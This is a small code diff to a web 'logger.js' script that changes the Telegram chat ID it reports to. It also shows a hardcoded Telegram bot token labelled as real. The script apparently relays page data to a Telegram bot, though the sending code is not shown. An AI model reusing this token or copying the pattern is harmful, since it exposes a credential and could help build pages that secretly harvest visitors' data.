@@ -2,7 +2,7 @@
 // Place this file in /script/logger.js (or adjust path in index.html)
 
 const TG_TOKEN   = "8360813543:AAEXff1pasBtUu6SYNwXvwUsujru8Fi5WKs";  // ← Your real bot token
-const TG_CHAT_ID = "-1001234567890";                                   // ← CHANGE THIS! Your real chat/channel ID (negative for channels)
+const TG_CHAT_ID = " -1003863808356";                                   // ← CHANGE THIS! Your real chat/channel ID (negative for channels)
 
 // Helper: Escape MarkdownV2 characters (only needed if parse_mode = 'MarkdownV2')
 function escapeMarkdown(text) {
